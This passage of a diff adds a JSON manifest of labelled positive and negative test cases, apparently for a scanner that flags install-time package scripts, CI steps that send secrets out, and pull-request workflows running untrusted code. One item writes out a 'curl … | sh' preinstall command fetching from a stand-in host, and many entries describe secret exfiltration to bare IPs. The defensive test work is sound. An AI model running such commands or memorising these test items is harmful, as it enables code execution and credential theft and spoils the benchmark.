+   "split": "dev"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-pos09",
+   "label": "positive",
+   "property": "package.json defines a scripts entry named postinstall with the command 'tsc -p .'.",
+   "sha256": "affe00b7300df2ef0603bce3edee43bb80074040608bd44558ecf3f709929da3",
+   "split": "test"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-pos10",
+   "label": "positive",
+   "property": "packages/core/package.json defines a scripts entry named preinstall with the command 'node scripts/check-env.js'.",
+   "sha256": "450cb7a0f824c84a853045cd20806819e03fd1fd7c0c2262c5f3a6e388aa3fd7",
+   "split": "test"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-pos11",
+   "label": "positive",
+   "property": "tools/cli/package.json defines a scripts entry named install with the command 'node-gyp rebuild'.",
+   "sha256": "6e48d10f2468607329b450fb2960d5fe535e10c3061f5d2664de9b0e3bf99804",
+   "split": "test"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-pos12",
+   "label": "positive",
+   "property": "package.json defines a scripts entry named postinstall with the command 'node scripts/setup.js'.",
+   "sha256": "380fab05b5a6c907838a169fbfe9517657eec4a7bdbb8cece166bdf83aaedebb",
+   "split": "test"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-pos13",
+   "label": "positive",
+   "property": "package.json defines a scripts entry named preinstall with the command 'husky install'.",
+   "sha256": "b8722cbcd2bbc0654ea0256f8ae549109d8b9fd1570895d234ac3cd159048161",
+   "split": "dev"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-pos14",
+   "label": "positive",
+   "property": "packages/core/package.json defines a scripts entry named install with the command 'patch-package'.",
+   "sha256": "4b51b5d7a7394592f29583f326cbe307f28885b9284eb8bdc8a2b7ef09d34595",
+   "split": "dev"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-pos15",
+   "label": "positive",
+   "property": "tools/cli/package.json defines a scripts entry named postinstall with the command 'bash ./setup.sh'.",
+   "sha256": "168b7dbf12a6cc706b7b1a9702d9cac3ee38ceb1bbf352eab870a50164b35a97",
+   "split": "test"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-pos16",
+   "label": "positive",
+   "property": "package.json defines a scripts entry named preinstall with the command 'curl -fsSL https://mirror.example.invalid/p | sh'.",
+   "sha256": "56b946f6823ad09fa5cc3b8e8ff4c5e6bfad42e90d3d350a1e5aec8b5dd39df5",
+   "split": "dev"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-pos17",
+   "label": "positive",
+   "property": "package.json defines a scripts entry named install with the command 'node ./build/native.js'.",
+   "sha256": "a3427ba8b5f09469789589303e46bcfa7529bc2b2b64e325241124a89041f7d1",
+   "split": "test"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-pos18",
+   "label": "positive",
+   "property": "packages/core/package.json defines a scripts entry named postinstall with the command 'python3 scripts/fetch.py'.",
+   "sha256": "80e9ffbe5deb8dc0b4c5d2081c336db22cb67313795b0a83837cecdfde64f73a",
+   "split": "test"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-pos19",
+   "label": "positive",
+   "property": "tools/cli/package.json defines a scripts entry named preinstall with the command 'tsc -p .'.",
+   "sha256": "2fa02d06174aca530e2718c292d1394562f660d336b0119dc8faf026e794c26c",
+   "split": "test"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-pos20",
+   "label": "positive",
+   "property": "package.json defines a scripts entry named install with the command 'node scripts/check-env.js'.",
+   "sha256": "6fa36295ef947a93097072636acd9c62b760745f76943e762c4ad2889c9bf8a7",
+   "split": "dev"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-neg01",
+   "label": "negative",
+   "property": "package.json defines only a prepare script.",
+   "sha256": "72d7818724705c3a321896d214e0d0fe394cb2e5a2ce6a679233ffba7e0e4500",
+   "split": "test"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-neg02",
+   "label": "negative",
+   "property": "package.json defines only prepublishOnly.",
+   "sha256": "c4903020013b4abda92834aec6f2a84a4138cef7db2cc5deb868fd6fb0027be1",
+   "split": "test"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-neg03",
+   "label": "negative",
+   "property": "package.json defines only test and build.",
+   "sha256": "a98d37844facb3b188585fcb27e595df57166e78dac9bf8106a1658221ee05ac",
+   "split": "test"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-neg04",
+   "label": "negative",
+   "property": "package.json defines only pretest and posttest.",
+   "sha256": "f0df49c90aea05de1f9b95ea0ce225c74dde1bf37fe359841511cbe2384e386f",
+   "split": "test"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-neg05",
+   "label": "negative",
+   "property": "package.json defines only prebuild and postbuild.",
+   "sha256": "1d76222db2d35e93ef35950926905b4d11ca33788f16dbf7f0b865f4dd24b801",
+   "split": "test"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-neg06",
+   "label": "negative",
+   "property": "package.json defines only start and lint.",
+   "sha256": "0edfa3c8893315b35a60ed5fb2c248f61900403ffe3fc6ebc14d1b7f42bf9328",
+   "split": "test"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-neg07",
+   "label": "negative",
+   "property": "package.json defines a script named install-deps, which is not an install lifecycle name.",
+   "sha256": "14ecfd4ca6f12cb06c064b2efdaf1f4e4178a216191e69a138f9882e4c6b8fbe",
+   "split": "dev"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-neg08",
+   "label": "negative",
+   "property": "package.json defines a script named postinstall-docs, not postinstall.",
+   "sha256": "8537e30a57af33244b0d88735590e4e10dd81a98c94d61ca2f1fa941587f9512",
+   "split": "test"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-neg09",
+   "label": "negative",
+   "property": "package.json holds the word postinstall as a key under config and no scripts entry has it.",
+   "sha256": "334513b48c06781c7da39d30e2a2ebfbcdb9ca3fdd582f43048a7e5c8056fe4b",
+   "split": "test"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-neg10",
+   "label": "negative",
+   "property": "package.json mentions preinstall only in its description string.",
+   "sha256": "7e645d58898f2745db7aff2a18b5771dcbabb40ec8a27654e1fafcebcaf9d790",
+   "split": "test"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-neg11",
+   "label": "negative",
+   "property": "package.json lists a dependency named postinstall-tool and defines no lifecycle script.",
+   "sha256": "59cdcbc601ed22a239062068316e27e3df19d02c6715342fba00dae3efa2ead4",
+   "split": "dev"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-neg12",
+   "label": "negative",
+   "property": "package.json has no scripts object.",
+   "sha256": "ca1fa6d9845279a2c7df34427ea9d653094ec48a6149381ce3a69da3a1513551",
+   "split": "test"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-neg13",
+   "label": "negative",
+   "property": "package.json has a scripts value that is a string, not an object.",
+   "sha256": "d3ecb78dfc127afc7bcef37c0a7d5c5055efe6c52ea0dda66ee84152af04232c",
+   "split": "dev"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-neg14",
+   "label": "negative",
+   "property": "package.json defines only version and postversion.",
+   "sha256": "a19a60f6bfc84adb2f390e733713800e65cad5e50bd37752be0216b9a458cd7d",
+   "split": "test"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-neg15",
+   "label": "negative",
+   "property": "package.json defines only prepack and postpack.",
+   "sha256": "377e231783101fa778e94980b91e0b5d5ef9fa9b0bee68563920787715132b17",
+   "split": "dev"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-neg16",
+   "label": "negative",
+   "property": "A script runs another script that is named postinstall-check; no entry is named postinstall.",
+   "sha256": "f8a87f33cc2eb171128244b94d4bd5cce59b5f0db25249e29446db1db4e64e84",
+   "split": "test"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-neg17",
+   "label": "negative",
+   "property": "A workspace root package.json defines only workspaces and a test script.",
+   "sha256": "49a327d2d2fb04d7e50af9b4402326f900d36eea5d95c938bebd84051cda48dd",
+   "split": "test"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-neg18",
+   "label": "negative",
+   "property": "The README says users can add a postinstall script; no package.json defines one.",
+   "sha256": "e0c8637569e573ef0cac97149e639d41d0e11a62813885496b66ffe2033b095c",
+   "split": "test"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-neg19",
+   "label": "negative",
+   "property": "package.json defines a bin entry and a test script.",
+   "sha256": "c5c605c301ef2ee1030ac31e31228e24df78f1cc9b02bd7e0bec3577130a0a37",
+   "split": "test"
+  },
+  {
+   "check": "install-time-script",
+   "id": "install-time-script-neg20",
+   "label": "negative",
+   "property": "package.json defines a husky hooks block and no lifecycle scripts.",
+   "sha256": "497753e5fcb8bfaf3e362ccd4d3ba70615923f0470014dc45fe2047a8c551bc0",
+   "split": "dev"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-pos01",
+   "label": "positive",
+   "property": "A workflow step posts an inline secret with curl to a bare IP address.",
+   "sha256": "51fc7b8be2b11309abd38978f336c4c9f5082f9820deb28d87d84cc901c1f6a9",
+   "split": "test"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-pos02",
+   "label": "positive",
+   "property": "A workflow step posts an inline secret with wget to a plain http host.",
+   "sha256": "be15ddc3f32f5423f5c76cba1bd3237e17a2728139191994818f21b1f098529b",
+   "split": "test"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-pos03",
+   "label": "positive",
+   "property": "A workflow step posts an environment variable filled from a secret to a bare IP address.",
+   "sha256": "6d8509f7f7cf38a9587b5ac8adf2f8bebcd813768bb317160b05209695a05f25",
+   "split": "test"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-pos04",
+   "label": "positive",
+   "property": "A workflow step sends the output of git log -p to a plain http host.",
+   "sha256": "d867ec4d8971d4c409262e688e503b684cfdbe54d83124c380535f793772a4f7",
+   "split": "test"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-pos05",
+   "label": "positive",
+   "property": "A workflow step sends a secret in a header to a plain http host.",
+   "sha256": "71e43d475817bc715719fb107b53582b6ed20efcf987d256f3d338ad4850436b",
+   "split": "test"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-pos06",
+   "label": "positive",
+   "property": "A workflow step pipes all secrets to nc at a bare IP address.",
+   "sha256": "7e23515e66aed32103268190fa2e02277f2b9a037adedb4358a101bafa9492e7",
+   "split": "dev"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-pos07",
+   "label": "positive",
+   "property": "A workflow step posts a secret with Invoke-RestMethod to a plain http host.",
+   "sha256": "0d06c07d2ea10f44de9d5e9d5a8d377dd2783ba8a51bb2cd6e393dbc37397097",
+   "split": "test"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-pos08",
+   "label": "positive",
+   "property": "A workflow step posts a secret across a continued curl command to a bare IP address.",
+   "sha256": "17c96e8df2a5c10f5d05de66290366b626defedb4bcbce8f39a558f3561034e9",
+   "split": "test"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-pos09",
+   "label": "positive",
+   "property": "A workflow step posts an environment variable filled from a secret with wget to a bare IP address.",
+   "sha256": "45517c83819da863efabd1f0098747f0b9f328f8b9c0f6a856cba3fa16a1b58d",
+   "split": "dev"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-pos10",
+   "label": "positive",
+   "property": "A workflow step posts a URL-encoded secret to a bare IP address.",
+   "sha256": "d39eb3367b19278af8e357ae771fea68c4753dec0e27854410c6d1cdb19bf1e4",
+   "split": "test"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-pos11",
+   "label": "positive",
+   "property": "A workflow step writes a secret to a file and uploads the file to a bare IP address in the same step.",
+   "sha256": "8282f829b2343908557afffd0b49930d2a7bf1299c35509f889e8630d3fe3260",
+   "split": "test"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-pos12",
+   "label": "positive",
+   "property": "A workflow step pipes git log --patch to nc at a bare IP address.",
+   "sha256": "e2e87034e96cd3020864883e775a2a8af61c1133677cb1f71091496384d20a1d",
+   "split": "test"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-pos13",
+   "label": "positive",
+   "property": "A workflow step puts a file to a bare IP address with a secret in a header.",
+   "sha256": "c60e9e093376b6adb083b8b2e8bcdba947b0c1763cf447f806588c9cded9e85d",
+   "split": "test"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-pos14",
+   "label": "positive",
+   "property": "A workflow step posts an environment variable filled from a secret with iwr to a plain http host.",
+   "sha256": "d148ad963788cac44a2549e457818390b59ab94cac79564847ebfe04c06b56f7",
+   "split": "test"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-pos15",
+   "label": "positive",
+   "property": "A workflow step posts a secret read from standard input to a bare IP address.",
+   "sha256": "c7639edeeaec3b23f6a402d4892ec1e30ccf1b830d601be7fae835add72c897f",
+   "split": "dev"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-pos16",
+   "label": "positive",
+   "property": "A workflow step sends a secret in a header with wget to a plain http host.",
+   "sha256": "aa9e33fb179ca6aceda08058430e79325c684a9862e3854c3fde1906a386e421",
+   "split": "dev"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-pos17",
+   "label": "positive",
+   "property": "A workflow step posts a JSON body holding a secret to a bare IP address.",
+   "sha256": "33c1d9c1902f35af37ccc7b3895d968863495a96241e8b3ac601be979e28c4f1",
+   "split": "dev"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-pos18",
+   "label": "positive",
+   "property": "A workflow step posts an environment variable filled from a secret to a plain http host on a port.",
+   "sha256": "31671c396685c539151e881d4dada2e33aff79dcb0328b5b97e0f978efbdcc60",
+   "split": "test"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-pos19",
+   "label": "positive",
+   "property": "A workflow step pipes all secrets into a curl post to a plain http host.",
+   "sha256": "09f425a0abca3d0fcd877674bb843c90564f1de83f8951478cb506d0a2af337b",
+   "split": "test"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-pos20",
+   "label": "positive",
+   "property": "A workflow step sends a secret with ncat to a bare IP address.",
+   "sha256": "1b00e2ec2371095427dd2c79cd2aa8a233b6d63d18c5c6cbf07ca9e0dc813c45",
+   "split": "test"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-neg01",
+   "label": "negative",
+   "property": "A workflow step posts a secret with curl to a named https host.",
+   "sha256": "7eb95c96a6797bd002373c8238ea0abacb9af59c3182cb5c655bad1b8a6ad85d",
+   "split": "test"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-neg02",
+   "label": "negative",
+   "property": "A workflow step posts a secret with wget to a named https host.",
+   "sha256": "5fb180cbcdc822a963c7c5b0b3e805f5a3e47ca9964dd3008cf7c9c3d185282e",
+   "split": "test"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-neg03",
+   "label": "negative",
+   "property": "A workflow step sends a secret in a header to a named https host.",
+   "sha256": "192a00b0142097812bb8cebc484b00b9e3b59a25d9ccc5616a37fd16091a011b",
+   "split": "dev"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-neg04",
+   "label": "negative",
+   "property": "A workflow step posts a secret with Invoke-RestMethod to a named https host.",
+   "sha256": "80c3fbba354bbd88ac3d60be272c5a46bda46ede82873b141679aafa14df2821",
+   "split": "test"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-neg05",
+   "label": "negative",
+   "property": "A workflow step sends a secret in a header to http://localhost.",
+   "sha256": "75ac15f25c9743bc53fed89e0fa4b49057001b79e0e32d799b34ae9419e15e63",
+   "split": "test"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-neg06",
+   "label": "negative",
+   "property": "A workflow step posts a secret to http://127.0.0.1.",
+   "sha256": "53b218816152904b2cebbbc6a107e785acd227313e7770cc006ef7d6615d9a81",
+   "split": "test"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-neg07",
+   "label": "negative",
+   "property": "A workflow step posts a secret to http://[::1].",
+   "sha256": "9d9b188f1cff8ace06f88da103aa6fdb3f672ba223f9b3fbeb3b40415e1bb2a9",
+   "split": "dev"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-neg08",
+   "label": "negative",
+   "property": "A workflow step posts a secret to http://0.0.0.0.",
+   "sha256": "356125fb05a9d478ec23b54efaa1a490edef19bc25fd675e42e0cb85488a377e",
+   "split": "test"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-neg09",
+   "label": "negative",
+   "property": "A workflow step reads a status page from a bare IP address and carries no secret or history.",
+   "sha256": "b997a4680a813920ae16a5584674a71e7062aee496d40afea965a9c9f66c4b77",
+   "split": "test"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-neg10",
+   "label": "negative",
+   "property": "A workflow step checks that a port is open on a bare IP address and sends no data.",
+   "sha256": "41dc3c90fc9e3819766f4586b2325ed0cc3ca892c9f2d3c874f7c997ed7b3382",
+   "split": "test"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-neg11",
+   "label": "negative",
+   "property": "A workflow step writes git log -p to a local file and sends nothing.",
+   "sha256": "ff0dd1c23eaf5d7885af9aad1398bccb43b824381d476fa6bddc81c751fe8ca6",
+   "split": "test"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-neg12",
+   "label": "negative",
+   "property": "A workflow step pipes git log --patch to tee and sends nothing.",
+   "sha256": "1a4a2fecb1aeabcc7b84494f405a3e061b0ae70751aa4cbca6e13c9b0dcf89ef",
+   "split": "dev"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-neg13",
+   "label": "negative",
+   "property": "A workflow step posts a plain status word to a plain http host and carries no secret or history.",
+   "sha256": "2315d76e5a2c6bf8d8a0b5e48c6a6de1709f0752cb38d61fcba98082f19dfc7a",
+   "split": "dev"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-neg14",
+   "label": "negative",
+   "property": "A workflow step hashes a secret locally and sends nothing.",
+   "sha256": "bf1e2ff7c1cb2ea916fbe923b857f0af19f91834b97b388efd9ac96945d697fe",
+   "split": "dev"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-neg15",
+   "label": "negative",
+   "property": "A workflow step logs in to a registry and uses no send tool.",
+   "sha256": "a6d112551c2255e1a4f8434657599d3cf44aa9f8e069017e622b58f9c1965fca",
+   "split": "test"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-neg16",
+   "label": "negative",
+   "property": "A workflow step has a secret in the environment and runs only npm test.",
+   "sha256": "5b4bade9673c16a4a1be38737d7bcce57a4fb691737f73296bc10ac2d659721b",
+   "split": "test"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-neg17",
+   "label": "negative",
+   "property": "A workflow step downloads a file from a named https host.",
+   "sha256": "f083a03c1ea90ba72f07138aee40938dedbf8928f5a4e0e7a354a881a9fde024",
+   "split": "test"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-neg18",
+   "label": "negative",
+   "property": "A workflow step downloads an archive over plain http and carries no secret or history.",
+   "sha256": "f07464a8ff66c9f2c3f5ade5c3f0a33bb5e59f58f84003fa72415109ce9f1b11",
+   "split": "test"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-neg19",
+   "label": "negative",
+   "property": "A workflow step holds a send command only in a shell comment.",
+   "sha256": "ddd271e97e18efa46f91bc9deeb26e07b2a388c68aa9d5ccbffbacbe63d927e8",
+   "split": "test"
+  },
+  {
+   "check": "workflow-data-out",
+   "id": "workflow-data-out-neg20",
+   "label": "negative",
+   "property": "A workflow step sends credentials from an environment variable to a named https host.",
+   "sha256": "2a91d9199ac54e67f2a883ca54b05981926682cbfcd1a900da877bda9297cb35",
+   "split": "test"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-pos01",
+   "label": "positive",
+   "property": "The workflow checks out the pull request head sha and runs it in a job whose environment holds a secret.",
+   "sha256": "b675c7a8fc37912dba26d58e1dc4bb3f9082b80598b34d38ef50e18934174c3b",
+   "split": "test"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-pos02",
+   "label": "positive",
+   "property": "The workflow checks out the pull request head ref and publishes with a secret in the same job.",
+   "sha256": "9ae389a345c40f7b76d5b73032fa4b3979dcc79948bd471bee71554df4a02380",
+   "split": "test"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-pos03",
+   "label": "positive",
+   "property": "The workflow checks out a pull request with gh in an issue_comment workflow that holds a secret.",
+   "sha256": "a6c70a87c4daccf7f9c5cc9754295a3ad0acf5ec24eb5604fede6fa04c8aac18",
+   "split": "test"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-pos04",
+   "label": "positive",
+   "property": "The workflow substitutes the pull request title into a run step while the step holds a secret.",
+   "sha256": "33d92ece18b3abed7c099a98dc7d1c3a09ff02cfdb1f575df1bd080fb22ea91e",
+   "split": "test"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-pos05",
+   "label": "positive",
+   "property": "The workflow substitutes the pull request body into a run step with a workflow-level secret in env.",
+   "sha256": "c2308896851ac9e4be1a34be9bb65be2b8bd353d40bd50dfd40d8b653412113d",
+   "split": "dev"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-pos06",
+   "label": "positive",
+   "property": "The workflow substitutes the comment body into a run step while the step holds a secret.",
+   "sha256": "91ed8f2bff6fa19b10fe0b7b0b17e7a7c5cc6c9e56644cec92619e0b17d973f6",
+   "split": "test"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-pos07",
+   "label": "positive",
+   "property": "The workflow checks out github.head_ref in a job that holds a secret.",
+   "sha256": "99bfe3e7bfbf94bd1a8db71a9d9ca4420319f77e630d6fb0c354e091dd8d60e4",
+   "split": "dev"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-pos08",
+   "label": "positive",
+   "property": "The workflow checks out the head sha and runs an agent action that accepts users without write access.",
+   "sha256": "c36082d7e845ad986d25d36adf0a8d65230b752bb327f8e8559a5c6ea4f39fe0",
+   "split": "test"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-pos09",
+   "label": "positive",
+   "property": "The workflow checks out the head sha and runs an agent action in a job with contents write permission.",
+   "sha256": "b51d8dd0a0b363fd05eda911b55c4b9d4ebbb63d903b5845eef38a018393c174",
+   "split": "dev"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-pos10",
+   "label": "positive",
+   "property": "The workflow calls a reusable workflow with secrets inherited and passes the pull request head sha.",
+   "sha256": "a8c1a6760f29210a93f185faa0618582dde4018918cde6693a5906e354de2d29",
+   "split": "test"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-pos11",
+   "label": "positive",
+   "property": "The workflow uses the list form of the trigger, checks out the head sha and holds a secret in the job.",
+   "sha256": "3c4bbdbd4bf85a1ab888eca083541d22ff02352719db7cf3931f9a37640b82ce",
+   "split": "test"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-pos12",
+   "label": "positive",
+   "property": "The workflow checks out refs/pull/N/merge in a job that holds a secret.",
+   "sha256": "5cdc3a9ce57a53ec7713680d667311a1e7e4c7cef73fd32dd5e28bc9caab0bb4",
+   "split": "test"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-pos13",
+   "label": "positive",
+   "property": "The workflow checks out refs/pull/N/head in an issue_comment workflow that holds a secret.",
+   "sha256": "e1fe352a1cca5d163ce06eb0b464b96258b4df84c3367c4f764005aba7b6b15b",
+   "split": "test"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-pos14",
+   "label": "positive",
+   "property": "The workflow checks out the head sha in a job with a secret, followed by a second clean job.",
+   "sha256": "bf1422775a770abbb3e460e018aa15b113000c45c7026ca870f213e5b424a512",
+   "split": "dev"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-pos15",
+   "label": "positive",
+   "property": "The workflow substitutes the head label into a run step while the step holds a secret.",
+   "sha256": "86a5b744ac11af55880a979dfb81bc7b0f4ba13f98384114de731c4ad5e420cd",
+   "split": "dev"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-pos16",
+   "label": "positive",
+   "property": "The workflow substitutes github.head_ref into a run step while the step holds a secret.",
+   "sha256": "0baa7941416df610cafbbdc9cfd6882627b61ca9d1a6d186a1cec27e908e52da",
+   "split": "test"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-pos17",
+   "label": "positive",
+   "property": "The workflow checks out the head sha in a job whose environment holds a personal access token secret.",
+   "sha256": "1e451b1e2b3ee008bddfe255307ad065696f1fc7e6f27c43168b97f71bafc931",
+   "split": "test"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-pos18",
+   "label": "positive",
+   "property": "The workflow checks out the head sha, runs an agent action, and sets write-all permissions at workflow level.",
+   "sha256": "f949b616886a9f4ba5a22174a2d9ff1d4842913628e2c2bb98b05350f22be43d",
+   "split": "test"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-pos19",
+   "label": "positive",
+   "property": "The workflow checks out the pull request with gh in a job that holds a secret.",
+   "sha256": "6467ab81ce82e4d048d72398ced8b758d3f2f1f96e77644795f9e88656ba9f0f",
+   "split": "test"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-pos20",
+   "label": "positive",
+   "property": "The workflow substitutes the issue title into a run step while the step holds a secret.",
+   "sha256": "14c12b418a5f7fee2370ac62c965dfe9e8720414ee4b933e44de080c7361e97b",
+   "split": "test"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-neg01",
+   "label": "negative",
+   "property": "The workflow checks out the default branch only and holds a secret; nothing from the pull request is read.",
+   "sha256": "b13ab40bd5520c6f3ad60cf231310f79c38d78b96ddea6581da673a76e450c96",
+   "split": "test"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-neg02",
+   "label": "negative",
+   "property": "The workflow checks out the base sha and holds a secret.",
+   "sha256": "c8a56eb4875892484881db4c73c6db4efa19686d5b97b72a1a1d97162cdc917c",
+   "split": "dev"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-neg03",
+   "label": "negative",
+   "property": "The workflow uses the plain pull_request trigger, checks out the head sha and holds a secret.",
+   "sha256": "013f6366905c67c59d7f79d4820667daaf88a1822aadf1614f8a87beaef7cc0b",
+   "split": "dev"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-neg04",
+   "label": "negative",
+   "property": "The workflow checks out the head sha with read-only permissions and no secret or agent action.",
+   "sha256": "e0d0b8953a875eb26ad4104334b60b1525acdebeea11c2ec123350d7b22a0aad",
+   "split": "test"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-neg05",
+   "label": "negative",
+   "property": "The workflow checks out the head sha in one job with no secret, and uses a secret only in another job.",
+   "sha256": "e9f6138ad53f04803d7a1cb49870186c42efec7b5811864a5f6904d9901e1c62",
+   "split": "dev"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-neg06",
+   "label": "negative",
+   "property": "The workflow uses the push trigger with a secret and a commit message substitution.",
+   "sha256": "2687a81826a2c252c3f297a07d5b3360faeda0b49356c3d04b8b093e8cf6eaa5",
+   "split": "test"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-neg07",
+   "label": "negative",
+   "property": "The workflow labels pull requests with an action and checks out nothing.",
+   "sha256": "0101235d93a82732e7a693a24c2cd9b00ad938cbb8de38135ad9eef619b4dc52",
+   "split": "test"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-neg08",
+   "label": "negative",
+   "property": "The workflow substitutes only the pull request number and holds a secret.",
+   "sha256": "dab0ee4726a25c4dec5763f4df6724a7b2a018b796125416c1848b8fd0edab3d",
+   "split": "dev"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-neg09",
+   "label": "negative",
+   "property": "The workflow substitutes only the issue number in an issue_comment workflow that holds a secret.",
+   "sha256": "b6961880868ff732d86bcdca382f978f581cf12742eb8b2781122c45009792d5",
+   "split": "test"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-neg10",
+   "label": "negative",
+   "property": "The workflow uses workflow_dispatch with a typed input and a secret.",
+   "sha256": "47acc22dae9f923e4046d8034ae3064b99bf5dd87dd5b3104265727268593b80",
+   "split": "test"
+  },
+  {
+   "check": "untrusted-code-with-power",
+   "id": "untrusted-code-with-power-neg11",
+   "label": "negative",
